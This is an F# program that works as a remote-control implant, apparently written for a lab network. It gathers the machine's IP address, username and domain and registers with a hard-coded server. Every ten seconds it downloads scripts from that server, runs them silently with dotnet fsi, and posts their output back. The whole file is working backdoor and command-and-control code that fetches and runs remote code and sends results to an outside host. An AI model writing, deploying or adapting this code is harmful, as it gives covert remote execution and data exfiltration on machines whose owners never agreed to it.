﻿open System
open System.Net
open System.Net.Http
open System.Diagnostics
open System.Threading
open System.IO

// Function to get machine details
let getMachineDetails () =
    try
        let ipAddress = 
            (Dns.GetHostEntry(Dns.GetHostName())).AddressList 
            |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) 
            |> Option.map (fun ip -> ip.ToString()) 
            |> Option.defaultValue "Unknown"
        let username = Environment.UserName
        let domainName = Environment.UserDomainName
        sprintf "%s_%s_%s" ipAddress username domainName
    with
    | ex -> 
        printfn "Error fetching machine details: %s" ex.Message
        "Unknown_Client"

// Function to download the script content as a string
let downloadScriptContent (url: string) =
    try
        use client = new WebClient()
        let scriptContent = client.DownloadString(Uri(url))
        Some scriptContent
    with
    | ex -> 
        printfn "Error downloading script: %s" ex.Message
        None

// Function to send output to the web server
let sendOutputToServer (url: string) (message: string) (clientId: string) =
    try
        use client = new HttpClient()
        let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
        let response = client.PostAsync(sprintf "%s/receiveOutput?clientId=%s" url clientId, content).Result
        if response.IsSuccessStatusCode then
            printfn "Output sent to server successfully"
        else
            printfn "Failed to send output to server: %s" (response.ReasonPhrase)
    with
    | ex -> 
        printfn "Error sending output to server: %s" ex.Message

// Function to run the downloaded script content using dotnet fsi
let runScriptContent (scriptContent: string) (clientId: string) =
    try
        let startInfo = ProcessStartInfo()
        startInfo.FileName <- "dotnet"  // Use dotnet to run fsi
        startInfo.Arguments <- "fsi"   // Arguments to run fsi
        startInfo.UseShellExecute <- false
        startInfo.RedirectStandardOutput <- true
        startInfo.RedirectStandardError <- true
        startInfo.RedirectStandardInput <- true
        startInfo.CreateNoWindow <- true

        use proc = Process.Start(startInfo)
        use stdInput = proc.StandardInput

        // Write the script content to the standard input of dotnet fsi
        stdInput.AutoFlush <- true
        stdInput.Write(scriptContent)
        stdInput.Close()

        let output = proc.StandardOutput.ReadToEnd()
        let errors = proc.StandardError.ReadToEnd()
        proc.WaitForExit()

        printfn "Script Output:\n%s" output
        if errors.Length > 0 then
            printfn "Script Errors:\n%s" errors

        // Send the output and errors to the web server
        let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
        sendOutputToServer "http://192.168.8.107:8000" fullOutput clientId  // Replace with your web server URL
    with
    | ex -> 
        printfn "Error running script: %s" ex.Message

// Function to fetch and run the script from the server
let fetchAndRunScript clientId =
    let baseUrl = "http://192.168.8.107:8000"
    async {
        try
            use httpClient = new HttpClient()
            let! response = httpClient.GetAsync(sprintf "%s/clients/%s/currentScript" baseUrl clientId) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                let! scriptPath = response.Content.ReadAsStringAsync() |> Async.AwaitTask
                if not (String.IsNullOrWhiteSpace(scriptPath)) then
                    match downloadScriptContent (sprintf "%s/scripts/%s" baseUrl scriptPath) with
                    | Some scriptContent -> runScriptContent scriptContent clientId
                    | None -> printfn "Failed to download script content"
                else
                    printfn "No script set for client"
            else
                printfn "Client not registered or no script set"
        with
        | ex -> 
            printfn "Error fetching or running script: %s" ex.Message
    }

// Function to execute the script download and run logic
let executeScript (clientId: string) =
    async {
        // Register the client with the web server
        try
            use client = new HttpClient()
            let content = new StringContent(clientId, System.Text.Encoding.UTF8, "text/plain")
            let! response = client.PostAsync("http://192.168.8.107:8000/registerClient", content) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                printfn "Client %s registered successfully" clientId
            else
                printfn "Failed to register client: %s" (response.ReasonPhrase)
        with
        | ex -> 
            printfn "Error registering client: %s" ex.Message

        // Fetch and run the script
        do! fetchAndRunScript clientId
    }

// Entry point for the program
[<EntryPoint>]
let main argv =
    // Get the machine details to use as client ID
    let clientId = getMachineDetails()

    // Execute the script immediately on startup
    executeScript clientId |> Async.RunSynchronously
    
    // Loop to check for new scripts every 10 seconds
    while true do
        // Sleep for 10 seconds
        Thread.Sleep(10000)
        // Execute the script again
        executeScript clientId |> Async.RunSynchronously

    0 // return an integer exit code
